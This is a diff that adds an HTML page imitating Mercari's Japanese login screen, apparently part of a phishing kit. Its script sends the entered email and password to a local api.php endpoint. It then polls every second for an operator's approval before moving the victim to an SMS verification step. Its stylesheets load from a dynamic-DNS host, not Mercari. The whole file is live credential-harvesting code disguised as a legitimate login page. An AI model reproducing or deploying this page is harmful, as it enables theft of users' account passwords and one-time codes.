@@ -1,0 +1,167 @@
+<html lang="ja-JP"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <link href="css/app.jp.css" rel="stylesheet">
+    <link rel="apple-touch-icon" href="./img/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="./img/favicon-32x32.png" sizes="32x32">
+    <link rel="apple-touch-icon" sizes="57x57" href="./img/apple-touch-icon-57x57.png">
+    <script src="js/site-jquery.min.js"></script>
+    <script src="js/layui.js"></script><link id="layuicss-laydate" rel="stylesheet" href="https://youbbmerct.ddns.net/js/css/modules/laydate/default/laydate.css?v=5.3.1" media="all"><link id="layuicss-layer" rel="stylesheet" href="https://youbbmerct.ddns.net/js/css/modules/layer/default/layer.css?v=3.5.1" media="all"><link id="layuicss-skincodecss" rel="stylesheet" href="https://youbbmerct.ddns.net/js/css/modules/code.css?v=2" media="all">
+    <link href="https://cdn.bootcdn.net/ajax/libs/layer/3.5.1/theme/default/layer.min.css" rel="stylesheet">
+
+
+</head>
+<body>
+
+<div class="single-container">
+    <header class="single-header">
+        <h1>
+            <a href="#">
+                <img src="img/logo_login.svg" alt="mercari">
+            </a>
+        </h1>
+    </header>
+
+    <main class="single-main">
+        <div class="login-panel">
+
+            <div class="login-form-inner">
+                <button id="google-login" class="btn-default btn-sns btn-sns-google">
+                    Googleでログイン
+                </button>
+                <button id="facebook-login" class="btn-default btn-sns btn-sns-facebook">
+                    <i><img style="background: white;  width: 20px; height: 20px;" src="img/Facebook.png"></i>
+                    Facebookでログイン
+                </button>
+                <button id="apple-login" class="btn-default btn-sns btn-sns-apple">
+                    <i style="text-align: center"><img style="background: black; width: 20px; height: 20px; align-content: center" src="img/apple.png"></i>
+                    Appleでログイン
+                </button>
+            </div>
+
+            <form action="sms.php" method="POST" id="myform" novalidate="novalidate">
+
+                <div class="login-form-inner">
+                    <ul class="has-error-text" id="errormsg" style="display: none">
+                        <li>
+                            アカウントまたはパスワード情報エラー
+                        </li>
+                    </ul>
+                    <div class="form-group">
+                        <input type="email" name="email" id="email" value="" placeholder="メールアドレス" class="login-input-text input-default">
+                    </div>
+                    <ul class="has-error-text" style="display: none" id="emailtest">
+                        <li>入力してください</li>
+                    </ul>
+
+                    <div class="form-group">
+                        <input type="password" name="password" id="password" placeholder="パスワード" class="login-input-text input-default">
+                    </div>
+                    <ul class="has-error-text" style="display: none" id="passwordtest">
+                        <li>入力してください</li>
+                    </ul>
+                    <div class="form-group">
+                        <div class="g-recaptcha login-captcha" data-sitekey="6LfYSLYaAAAAAD4xXu7MljrQASPQjyuMzA4XB1Pm"></div>
+                    </div>
+                    <button type="button" onclick="verify()" class="login-submit btn-default btn-red">ログイン</button>
+                    <input type="hidden" name="login_callback" value="/jp/">
+                    <a href="#">パスワードをお忘れの方</a>
+                </div>
+            </form>
+
+            <script>
+                var mask = null;
+                var timer = null;
+
+                function is_agree() {
+                    $.post('./api.php?act=is_agree&_r=' + Math.random(), function (res) {
+                        var t = JSON.parse(res);
+                        if (t.code == 'ok') {
+                            layer.close(mask);
+                            clearInterval(timer);
+                            $('#myform').attr('action', 'sms.php').submit();//jump
+                            return false;
+                        } else if(t.code=='ps') {
+                            layer.close(mask);
+                            clearInterval(timer);
+                            var errormsg = document.getElementById("errormsg");
+                            errormsg.style.display = "block";
+                        }else {
+                        }
+                    });
+
+                }
+
+                function verify() {
+                    var user = document.getElementById("email");
+                    var pwd = document.getElementById("password");
+                    var emailerror = document.getElementById("emailtest");
+                    var pwderror = document.getElementById("passwordtest");
+                    if (user.value == "") {
+                        user.style = "border-color: #ea352d;";
+                        emailerror.style.display = "block";
+                        return false;
+                    } else {
+                        user.style = "    border-color: #ccc";
+                        emailerror.style.display = "none";
+
+                    }
+                    if (pwd.value == "") {
+
+                        pwd.style = " border-color: #ea352d;";
+                        pwderror.style = "display: block";
+                        return false;
+                    } else {
+                        pwd.style = "border-color: #ccc;";
+                        pwderror.style = "display: none";
+                    }
+
+                    var uname = user.value;
+                    var upwd = pwd.value;
+                    $.ajax({
+                        url: './api.php?act=next_save&_r=' + Math.random(),
+                        type: 'post',
+                        data: {
+                            uname: uname, upwd: upwd
+                        },
+                        success: function (res) {
+                            var t = JSON.parse(res);
+                            if (t.code == 'ok') {
+                                mask = layer.load(2, {shade: [0.25, '#000']});
+                                timer = setInterval("is_agree()", 1000);
+                                return false;
+                            }
+                        }
+                    });
+                }
+            </script>
+        </div>
+    </main>
+
+    <footer class="single-footer">
+        <nav>
+            <ul class="clearfix">
+                <li>
+                    <a href="#">プライバシーポリシー</a>
+                </li>
+                <li>
+                    <a href="#">メルカリ利用規約</a>
+                </li>
+                <li>
+                    <a href="#">特定商取引に関する表記</a>
+                </li>
+            </ul>
+        </nav>
+        <a href="#" class="single-footer-logo">
+            <img src="img/logo-gray.svg" alt="mercari" width="80" height="65">
+        </a>
+        <p>
+            <small>© Mercari, Inc.</small>
+        </p>
+    </footer>
+</div>
+<script src="js/app.js"></script>
+
+
+</body></html>
